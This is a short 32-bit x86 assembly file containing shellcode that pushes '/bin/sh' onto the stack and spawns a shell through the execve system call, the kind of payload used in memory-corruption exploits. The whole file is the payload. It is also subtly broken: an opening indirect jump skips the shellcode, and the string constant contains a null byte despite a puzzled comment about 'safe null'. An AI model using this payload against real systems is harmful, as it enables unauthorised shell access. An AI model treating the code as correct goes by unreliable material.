.global _start
.text
_start:
	jmp *0x4(%esp)
	# safe null, whatever that means
	xor %eax, %eax
	# push the "/bin/sh" command string to the stack
	push $0x0068732f
	push $0x6e69622f
	# execve(command, NULL, NULL)
	mov $11, %eax	# int 11 is execve
	mov %esp, %ebx	# "/bin/sh" command string
	xor %ecx, %ecx	# no argv
	xor %edx, %edx	# no envp
	int $0x80
	# exit (0)
	mov $1, %eax	# int 1 is exit
	xor %ebx, %ebx	# return code 0
	int $0x80
